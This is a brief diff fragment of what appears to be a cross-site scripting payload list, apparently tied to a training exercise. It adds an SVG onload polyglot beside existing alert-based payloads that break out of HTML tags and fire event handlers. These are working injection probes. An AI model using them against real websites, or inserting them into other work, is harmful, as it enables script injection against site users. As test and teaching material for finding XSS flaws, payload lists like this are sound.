@@ -6,6 +6,7 @@
 <script>alert(document.domain)</script>
 
 javascript:/*--></​ title​ ></​ style​ ></​ textarea​ ></​ script​ ></​ xmp​ ><​ svg​ / ​ onload​ = ​ '+/"/+/onmouseover=1/+/[*/[]/+alert("fun exercise from Cybr")//'​ >
+<​ svg​ / ​ onload​ = ​ '+/"/+/onmouseover=1/+/[*/[]/+alert("fun exercise from Cybr")//'​ >
 
 
 <body oninput=javascript:alert(1)><input autofocus>
